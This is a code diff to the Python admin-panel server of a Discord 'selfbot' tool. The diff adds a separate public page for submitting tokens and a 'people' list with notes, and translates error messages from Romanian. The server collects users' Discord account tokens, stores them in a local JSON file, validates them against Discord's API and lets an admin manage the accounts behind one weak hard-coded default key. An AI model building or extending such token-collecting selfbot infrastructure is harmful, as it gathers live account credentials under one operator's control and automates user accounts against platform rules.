@@ -2,7 +2,11 @@
 """
 RED SELFBOT V1 - Admin Panel server (stdlib only, no discord/requests needed).
 
-Serves panel.html on 0.0.0.0:3000 plus a small REST API:
+Serves the ADMIN panel (admin.html) on 0.0.0.0:3000.
+The public token page (panel.html) is meant to be hosted elsewhere; it is
+also available at /public here for local testing.
+
+REST API (used by both pages):
     POST /api/login          {name, token}              -> register/connect account
     POST /api/admin/verify   {key}                      -> unlock admin panel
     GET  /api/users                                     -> list all users (admin)
@@ -11,7 +15,10 @@ Serves panel.html on 0.0.0.0:3000 plus a small REST API:
     GET  /api/blacklist                                 -> list blacklisted commands (admin)
     POST /api/blacklist      {cmd}                      -> add blacklisted command
     DELETE /api/blacklist    {cmd}                      -> remove blacklisted command
-    GET  /api/status                                    -> bot status (used by main.py)
+    GET  /api/people                                      -> list people / suggestions (admin)
+    POST /api/people       {name, tag, note}            -> add a person + note (admin)
+    DELETE /api/people     {id}                         -> remove a person (admin)
+    GET  /api/status                                    -> bot status (public, no secrets)
     GET  /health                                        -> liveness probe
 
 Run standalone:  python panel.py      (defaults to 0.0.0.0:3000)
@@ -23,9 +30,11 @@ from urllib.parse import urlparse
 
 BASE = os.path.dirname(os.path.abspath(__file__))
 DATA_DIR = os.path.join(BASE, "data")
-HTML_FILE = os.path.join(BASE, "panel.html")
+ADMIN_HTML = os.path.join(BASE, "admin.html")   # full admin UI (localhost:3000)
+PUBLIC_HTML = os.path.join(BASE, "panel.html")  # public token page (hosted elsewhere)
 USERS_FILE = os.path.join(DATA_DIR, "users.json")
 BLACKLIST_FILE = os.path.join(DATA_DIR, "blacklist.json")
+PEOPLE_FILE = os.path.join(DATA_DIR, "people.json")
 
 ADMIN_KEY = os.environ.get("ADMIN_KEY", "red2026")
 START_TIME = time.time()
@@ -73,6 +82,39 @@ def save_blacklist(b):
         save_json(BLACKLIST_FILE, b)
 
 
+# --------------------------- people / suggestions ---------------------------
+def load_people():
+    return load_json(PEOPLE_FILE, [])
+
+
+def save_people(p):
+    with _lock:
+        save_json(PEOPLE_FILE, p)
+
+
+def add_person(name, tag, note):
+    people = load_people()
+    entry = {
+        "id": "p%d" % (time.time() * 1000) + str(len(people)),
+        "name": (name or "").strip(),
+        "tag": (tag or "").strip(),
+        "note": (note or "").strip(),
+        "added_at": int(time.time()),
+    }
+    people.append(entry)
+    save_people(people)
+    return entry
+
+
+def remove_person(pid):
+    people = load_people()
+    out = [p for p in people if p.get("id") != pid]
+    if len(out) == len(people):
+        return False, people
+    save_people(out)
+    return True, out
+
+
 # ============================== TOKEN CHECK ==============================
 def check_token(token):
     """
@@ -82,7 +124,7 @@ def check_token(token):
     """
     token = (token or "").strip().strip('"').strip("'")
     if not token:
-        return {"valid": False, "error": "token gol", "code": 0}
+        return {"valid": False, "error": "empty token", "code": 0}
     req = urllib.request.Request(
         "https://discord.com/api/v10/users/@me",
         headers={"Authorization": token, "User-Agent": "Mozilla/5.0 (RedSelfbot Panel)"},
@@ -94,9 +136,9 @@ def check_token(token):
     except urllib.error.HTTPError as e:
         code = e.code
         if code == 401:
-            return {"valid": False, "error": "expirat / invalid (401)", "code": code}
+            return {"valid": False, "error": "expired / invalid (401)", "code": code}
         if code == 403:
-            return {"valid": False, "error": "cont flagged / blocat (403)", "code": code}
+            return {"valid": False, "error": "account flagged / blocked (403)", "code": code}
         if code == 429:
             return {"valid": None, "error": "rate limit (429)", "code": code}
         return {"valid": False, "error": "HTTP %s" % code, "code": code}
@@ -243,12 +285,20 @@ class PanelHandler(BaseHTTPRequestHandler):
             if not self._require_admin():
                 return
             return self._json({"ok": True, "blacklist": load_blacklist()})
-        # everything else -> the admin panel HTML
+        if p == "/api/people":
+            if not self._require_admin():
+                return
+            return self._json({"ok": True, "people": load_people()})
+        # pages: / -> admin panel (admin.html), /public -> public token page
+        if p in ("/public", "/public.html", "/panel.html"):
+            path, missing = PUBLIC_HTML, "panel.html"
+        else:
+            path, missing = ADMIN_HTML, "admin.html"
         try:
-            with open(HTML_FILE, "rb") as f:
+            with open(path, "rb") as f:
                 body = f.read()
         except Exception:
-            body = b"<h1>panel.html missing</h1>"
+            body = ("<h1>%s missing</h1>" % missing).encode("utf-8")
         self._send(200, body, "text/html; charset=utf-8")
 
     # ---------------------------- POST ----------------------------
@@ -260,9 +310,9 @@ class PanelHandler(BaseHTTPRequestHandler):
             name = (data.get("name") or "").strip()
             token = (data.get("token") or "").strip().strip('"').strip("'")
             if not name:
-                return self._json({"ok": False, "error": "da-mi un nume"}, 400)
+                return self._json({"ok": False, "error": "no name given"}, 400)
             if not token:
-                return self._json({"ok": False, "error": "da-mi un token"}, 400)
+                return self._json({"ok": False, "error": "no token given"}, 400)
             u = add_or_update_user(name, token)
             u["token"] = _mask(u["token"])
             return self._json({"ok": True, "user": u})
@@ -270,7 +320,7 @@ class PanelHandler(BaseHTTPRequestHandler):
         if p == "/api/admin/verify":
             if data.get("key") == ADMIN_KEY:
                 return self._json({"ok": True})
-            return self._json({"ok": False, "error": "admin key gresita"}, 401)
+            return self._json({"ok": False, "error": "wrong admin key"}, 401)
 
         if p == "/api/user":
             if not self._require_admin():
@@ -282,19 +332,28 @@ class PanelHandler(BaseHTTPRequestHandler):
                 return
             started = check_all_async()
             return self._json({"ok": started, "started": started,
-                               "error": None if started else "check deja in curs"})
+                               "error": None if started else "check already running"})
 
         if p == "/api/blacklist":
             if not self._require_admin():
                 return
             cmd = (data.get("cmd") or "").strip().lower().lstrip("$")
             if not cmd:
-                return self._json({"ok": False, "error": "da-mi o comanda"}, 400)
+                return self._json({"ok": False, "error": "no command given"}, 400)
             bl = load_blacklist()
             if cmd not in bl:
                 bl.append(cmd)
                 save_blacklist(bl)
             return self._json({"ok": True, "blacklist": bl})
+
+        if p == "/api/people":
+            if not self._require_admin():
+                return
+            name = (data.get("name") or "").strip()
+            if not name:
+                return self._json({"ok": False, "error": "no name given"}, 400)
+            entry = add_person(name, data.get("tag", ""), data.get("note", ""))
+            return self._json({"ok": True, "person": entry, "people": load_people()})
 
         return self._json({"ok": False, "error": "unknown route"}, 404)
 
@@ -309,6 +368,13 @@ class PanelHandler(BaseHTTPRequestHandler):
             bl = [c for c in load_blacklist() if c != cmd]
             save_blacklist(bl)
             return self._json({"ok": True, "blacklist": bl})
+        if p == "/api/people":
+            if not self._require_admin():
+                return
+            ok, people = remove_person((data.get("id") or "").strip())
+            if not ok:
+                return self._json({"ok": False, "error": "person not found"}, 404)
+            return self._json({"ok": True, "people": people})
         return self._json({"ok": False, "error": "unknown route"}, 404)
 
     def do_OPTIONS(self):
@@ -338,7 +404,7 @@ class PanelHandler(BaseHTTPRequestHandler):
         key = normalize_name(name)
         users = load_users()
         if key not in users:
-            return self._json({"ok": False, "error": "user inexistent"}, 404)
+            return self._json({"ok": False, "error": "user not found"}, 404)
 
         entry = users[key]
         if action == "suspend":
@@ -357,7 +423,7 @@ class PanelHandler(BaseHTTPRequestHandler):
             res = check_token(entry.get("token", ""))
             _apply_check_result(entry, res)
         else:
-            return self._json({"ok": False, "error": "actiune necunoscuta"}, 400)
+            return self._json({"ok": False, "error": "unknown action"}, 400)
 
         save_users(users)
         return self._json({"ok": True, "user": user_payload(key, users[key]),
@@ -382,7 +448,7 @@ def run_server(port=None, meta_provider=None):
         except OSError as e:
             print("[!] Port %s busy: %s" % (candidate, e))
             continue
-        print("[i] Admin panel on 0.0.0.0:%s (localhost:%s) - key: %s" % (candidate, candidate, ADMIN_KEY))
+        print("[i] Admin panel on 0.0.0.0:%s (localhost:%s)" % (candidate, candidate))
         try:
             srv.serve_forever()
         except KeyboardInterrupt:
@@ -395,6 +461,6 @@ if __name__ == "__main__":
     print("=" * 60)
     print("RED SELFBOT - ADMIN PANEL (standalone)")
     print("URL:       http://localhost:%s" % os.environ.get("PORT", "3000"))
-    print("Admin key: %s  (schimba cu: export ADMIN_KEY=parola-ta)" % ADMIN_KEY)
+    print("Admin key: from env ADMIN_KEY (has a built-in default)")
     print("=" * 60)
     run_server()
